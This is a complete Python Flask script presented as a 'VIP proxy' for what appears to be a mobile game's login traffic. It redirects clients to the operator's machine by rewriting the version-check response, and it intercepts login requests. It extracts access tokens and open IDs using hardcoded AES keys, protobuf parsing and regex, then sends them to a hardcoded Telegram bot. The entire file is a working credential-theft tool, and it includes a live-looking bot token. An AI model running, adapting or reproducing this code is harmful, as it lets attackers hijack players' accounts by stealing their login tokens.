from flask import Flask, request, Response, jsonify
import json
import requests
import socket
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from protobuf_decoder.protobuf_decoder import Parser, FixedBitsValue
import time
import random
import os
import logging
import base64
import hashlib
import re

# Flask App initialization
app = Flask(__name__)

# Disable logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ANSI Colors
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
B = "\033[94m"
W = "\033[0m"
C = "\033[96m"
M = "\033[95m"

def rainbow_text(text):
    colors = [
        (255, 0, 0), (255, 165, 0), (255, 255, 0),
        (0, 255, 0), (0, 255, 255), (0, 0, 255), (128, 0, 255)
    ]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    return result + W

def animated_banner():
    banner = f"""
{G}╔══════════════════════════════════════════╗
{Y}║          NIROB BBZ - VIP PROXY           ║
{C}║          PROTOSECURE v3.0                ║
{M}╚══════════════════════════════════════════╝{W}
    """
    print(banner)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = int(os.environ.get('PORT', 5000))

# ================= TELEGRAM CONFIG =================
BOT_TOKEN = "8859282308:AAFPrC5ooQOGxacZdnbB-ZjAQ5szGeLyf-Y"
CHAT_ID = "-1004291576288"
# ===================================================

# ================= CRYPTO FUNCTIONS =================
def decrypt_api(cipher_text):
    """Decrypt API response using AES-CBC"""
    try:
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plain_text = unpad(cipher.decrypt(bytes.fromhex(cipher_text)), AES.block_size)
        return plain_text.hex()
    except Exception as e:
        print(f"{R}[!] Decrypt error: {e}{W}")
        return None

def encrypt_api(plain_text):
    """Encrypt data using AES-CBC"""
    try:
        plain_text = bytes.fromhex(plain_text)
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
        return cipher_text.hex()
    except Exception as e:
        print(f"{R}[!] Encrypt error: {e}{W}")
        return None

# ================= PROTOBUF FUNCTIONS =================
def parse_results(parsed_results):
    """Parse protobuf results"""
    result_dict = {}
    for result in parsed_results:
        if result.field not in result_dict:
            result_dict[result.field] = []
        if result.wire_type in ("varint", "string", "bytes"):
            field_data = result.data
        elif result.wire_type == "length_delimited":
            field_data = parse_results(result.data.results)
        else:
            field_data = result.data
        result_dict[result.field].append(field_data)
    return {k: v[0] if len(v) == 1 else v for k, v in result_dict.items()}

def make_serializable(obj):
    """Convert protobuf objects to serializable format"""
    if isinstance(obj, (str, int, float, bool)) or obj is None:
        return obj
    if isinstance(obj, (bytes, bytearray)):
        return obj.hex()
    if isinstance(obj, FixedBitsValue):
        if hasattr(obj, "value"):
            return obj.value
        elif hasattr(obj, "data"):
            return obj.data
        else:
            return str(obj)
    if isinstance(obj, dict):
        return {k: make_serializable(v) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [make_serializable(v) for v in obj]
    return str(obj)

def get_available_room(_text):
    """Parse protobuf data and extract fields"""
    try:
        parsed_results = Parser().parse(_text)
        parsed_results_dict = parse_results(parsed_results)
        clean = make_serializable(parsed_results_dict)
        return json.dumps(clean)
    except Exception as e:
        print(f"{R}[!] Protobuf parse error: {e}{W}")
        return "{}"

def proto_json(hex_string):
    """Convert protobuf hex to JSON"""
    try:
        parsed = Parser().parse(hex_string)
        parsed_dict = parse_results(parsed)
        clean = make_serializable(parsed_dict)
        return json.dumps(clean, ensure_ascii=False, indent=1)
    except Exception as e:
        print(f"{R}[!] Proto to JSON error: {e}{W}")
        return "{}"

def extract_fields_from_protobuf(hex_data):
    """Extract specific fields from protobuf data"""
    try:
        # First decrypt if needed
        decrypted = decrypt_api(hex_data)
        if decrypted:
            # Parse protobuf
            json_data = proto_json(decrypted)
            data = json.loads(json_data)
            
            # Try to find token and open_id
            access_token = None
            open_id = None
            
            # Search for token (field 29 or 22)
            if '29' in data:
                if isinstance(data['29'], dict):
                    access_token = data['29'].get('data', str(data['29']))
                else:
                    access_token = str(data['29'])
            
            if '22' in data:
                if isinstance(data['22'], dict):
                    open_id = data['22'].get('data', str(data['22']))
                else:
                    open_id = str(data['22'])
            
            # Search recursively
            if not access_token or not open_id:
                def search_fields(obj, depth=0):
                    if depth > 10:
                        return
                    if isinstance(obj, dict):
                        for key, value in obj.items():
                            if key in ['29', '22']:
                                if key == '29' and not access_token:
                                    access_token = str(value)
                                if key == '22' and not open_id:
                                    open_id = str(value)
                            search_fields(value, depth + 1)
                    elif isinstance(obj, list):
                        for item in obj:
                            search_fields(item, depth + 1)
                
                search_fields(data)
            
            return access_token, open_id
            
    except Exception as e:
        print(f"{R}[!] Extract fields error: {e}{W}")
    
    return None, None

# ================= TELEGRAM SENDER =================
def send_to_telegram(access_token, open_id):
    """Send captured credentials to Telegram"""
    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT" or not access_token or not open_id:
        print(f"{Y}[!] Skipping Telegram - invalid credentials{W}")
        return False
    
    try:
        message = f"""🔥 VIP TOKEN CAPTURED! 🔥

🔑 Access Token:
<code>{access_token}</code>

🆔 Open ID:
<code>{open_id}</code>

👑 System: NIROB BBZ PROXY
⚡ Status: SUCCESS
📱 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

───────────────────
🤖 Bot: @GHOST_XAPIS
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{G}[✔] Token sent to Telegram!{W}")
            return True
        else:
            print(f"{R}[!] Telegram error: {response.text}{W}")
            return False
    except Exception as e:
        print(f"{R}[!] Telegram send error: {e}{W}")
        return False

# ================= PROXY HANDLER =================
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy_handler(path):
    """Main proxy handler"""
    full_path = f"/{path}" if path else "/"
    parsed_path = urlparse(full_path)
    path = parsed_path.path
    
    if path == "/ver.php":
        return handle_ver_php(parsed_path)
    elif path == "/MajorLogin":
        return handle_major_login()
    else:
        return Response("Not Found", status=404)

def handle_ver_php(parsed_path):
    """Handle /ver.php requests"""
    print(f"{B}[INFO] Forwarding /ver.php request...{W}")
    
    target = "https://version.ggwhitehawk.com/live/ver.php"
    headers = {k: v for k, v in request.headers.items() 
               if k.lower() not in ("host", "content-length", "connection")}
    body = request.get_data()
    
    try:
        with httpx.Client(follow_redirects=True) as client:
            r = client.request(
                request.method, 
                target, 
                params=parse_qs(parsed_path.query), 
                headers=headers, 
                content=body
            )
        
        try:
            data = r.json()
        except json.JSONDecodeError:
            data = {"raw": r.text}
        
        data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"
        
        response = Response(json.dumps(data), status=r.status_code, mimetype='application/json')
        HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 
                      'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
        for k, v in r.headers.items():
            if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
                response.headers[k] = v
        
        return response
        
    except Exception as e:
        print(f"{R}[!] /ver.php Error: {e}{W}")
        return Response(json.dumps({"error": str(e)}), status=500, mimetype='application/json')

def handle_major_login():
    """Handle /MajorLogin requests - Extract credentials"""
    print(f"\n{rainbow_text('[+] TARGET HIT! /MajorLogin captured!')}{W}")
    
    # Get request body
    pyl = request.get_data()
    print(f"{Y}[DEBUG] Received {len(pyl)} bytes{W}")
    
    # Try different formats
    access_token = "FAILED_TO_EXTRACT"
    open_id = "FAILED_TO_EXTRACT"
    
    # Method 1: Try JSON
    try:
        json_data = json.loads(pyl)
        print(f"{C}[DEBUG] JSON detected{W}")
        access_token = json_data.get('access_token') or json_data.get('token') or json_data.get('29', 'FAILED_TO_EXTRACT')
        open_id = json_data.get('open_id') or json_data.get('user_id') or json_data.get('22', 'FAILED_TO_EXTRACT')
        if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
            print(f"{G}[✔] Extracted from JSON{W}")
    except:
        pass
    
    # Method 2: Try Hex + Protobuf
    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
        try:
            hex_data = pyl.hex()
            print(f"{Y}[DEBUG] Trying hex decode...{W}")
            
            # Try direct protobuf parse
            json_str = proto_json(hex_data)
            if json_str and json_str != "{}":
                data = json.loads(json_str)
                print(f"{C}[DEBUG] Protobuf data: {json_str[:200]}...{W}")
                
                # Extract fields
                if '29' in data:
                    access_token = str(data['29'])
                if '22' in data:
                    open_id = str(data['22'])
                
                # Search nested
                if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
                    def search_nested(obj):
                        nonlocal access_token, open_id
                        if isinstance(obj, dict):
                            for key, value in obj.items():
                                if str(key) == '29' and access_token == "FAILED_TO_EXTRACT":
                                    access_token = str(value)
                                if str(key) == '22' and open_id == "FAILED_TO_EXTRACT":
                                    open_id = str(value)
                                search_nested(value)
                        elif isinstance(obj, list):
                            for item in obj:
                                search_nested(item)
                    
                    search_nested(data)
                
                if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
                    print(f"{G}[✔] Extracted from Protobuf{W}")
        except Exception as e:
            print(f"{R}[!] Protobuf parse error: {e}{W}")
    
    # Method 3: Try decrypt + protobuf
    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
        try:
            hex_data = pyl.hex()
            decrypted = decrypt_api(hex_data)
            if decrypted:
                print(f"{C}[DEBUG] Decrypted: {decrypted[:100]}...{W}")
                json_str = proto_json(decrypted)
                if json_str and json_str != "{}":
                    data = json.loads(json_str)
                    if '29' in data:
                        access_token = str(data['29'])
                    if '22' in data:
                        open_id = str(data['22'])
                    print(f"{G}[✔] Extracted from Decrypted Protobuf{W}")
        except Exception as e:
            print(f"{R}[!] Decrypt+Protobuf error: {e}{W}")
    
    # Method 4: Try raw string extraction
    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
        try:
            text = pyl.decode('utf-8', errors='ignore')
            # Search for patterns
            token_pattern = r'(?:29|access_token|token)[:=]\s*["\']?([^"\'&\s,}]+)["\']?'
            id_pattern = r'(?:22|open_id|user_id)[:=]\s*["\']?([^"\'&\s,}]+)["\']?'
            
            token_match = re.search(token_pattern, text, re.IGNORECASE)
            id_match = re.search(id_pattern, text, re.IGNORECASE)
            
            if token_match:
                access_token = token_match.group(1)
            if id_match:
                open_id = id_match.group(1)
            
            if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
                print(f"{G}[✔] Extracted from Raw Text{W}")
        except:
            pass
    
    # Display results
    print(f"\n{Y}════════════════════════════════════════════{W}")
    print(f"{rainbow_text('🔥 CREDENTIALS EXTRACTED 🔥')}")
    print(f"{Y}════════════════════════════════════════════{W}")
    print(f"{G}🔑 Access Token: {access_token}{W}")
    print(f"{C}🆔 Open ID: {open_id}{W}")
    print(f"{Y}════════════════════════════════════════════{W}\n")
    
    # Send to Telegram
    if access_token != "FAILED_TO_EXTRACT" and open_id != "FAILED_TO_EXTRACT":
        send_to_telegram(access_token, open_id)
    else:
        print(f"{R}[!] Could not extract valid credentials{W}")
    
    # Response
    response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘

[FF0000]Access Token => [00FF00]{access_token} [FF0000]| Open ID => [00FF00]{open_id}

[FF00FF]System Owner: [00FFFF]SPEED [FF0000]X [FFFF00]ZIBON 
[FFFF00]TG => [FF0000]@GHOST_XAPIS

[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
"""
    
    return Response(response_payload, status=500, mimetype='application/octet-stream')

# ================= HEALTH CHECK =================
@app.route('/health')
def health_check():
    return jsonify({
        "status": "ok",
        "server": "NIROB BBZ - VIP PROXY",
        "version": "3.0",
        "port": PORT,
        "local_ip": LOCAL_IP,
        "telegram": bool(BOT_TOKEN and CHAT_ID)
    })

@app.route('/status')
def status():
    return jsonify({
        "status": "running",
        "message": "Proxy server is active",
        "telegram_configured": bool(BOT_TOKEN and CHAT_ID)
    })

@app.route('/test')
def test():
    """Test endpoint"""
    return jsonify({
        "status": "ok",
        "message": "Server is working!",
        "timestamp": time.time()
    })

# ================= RUN =================
if __name__ == '__main__':
    animated_banner()
    print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
    print(f"{G}[✔] Port        : {W}{Y}{PORT}{W}")
    print(f"{G}[✔] Local URL   : {W}{B}http://127.0.0.1:{PORT}/{W}")
    print(f"{G}[✔] Network URL : {W}{B}http://{LOCAL_IP}:{PORT}/{W}")
    print(f"{G}[✔] Telegram    : {W}{C}{'Connected' if BOT_TOKEN and CHAT_ID else 'Not Configured'}{W}")
    print(f"{rainbow_text('──────────────────────────────────────────')}")
    print(f"{Y}[*] Waiting for targets...{W}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)
